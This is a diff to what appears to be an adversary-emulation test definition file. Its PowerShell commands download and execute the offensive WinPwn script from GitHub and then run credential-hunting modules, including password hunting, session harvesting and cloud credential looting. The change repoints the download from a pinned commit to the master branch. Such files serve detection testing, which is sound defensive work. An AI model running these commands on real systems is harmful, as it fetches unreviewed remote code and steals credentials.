@@ -95,7 +95,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       sensitivefiles -noninteractive -consoleoutput
     name: powershell
 - name: WinPwn - Snaffler
@@ -105,7 +105,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       Snaffler -noninteractive -consoleoutput
     name: powershell
 - name: WinPwn - powershellsensitive
@@ -115,7 +115,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       powershellsensitive -consoleoutput -noninteractive
     name: powershell
 - name: WinPwn - passhunt
@@ -125,7 +125,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       passhunt -local $true -noninteractive
     cleanup_command: |-
       rm -force .\passhunt.exe -ErrorAction Ignore
@@ -143,7 +143,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       sessionGopher -noninteractive -consoleoutput
     name: powershell
 - name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
@@ -153,7 +153,7 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
       SharpCloud -consoleoutput -noninteractive  
     name: powershell
 - name: List Credential Files via PowerShell
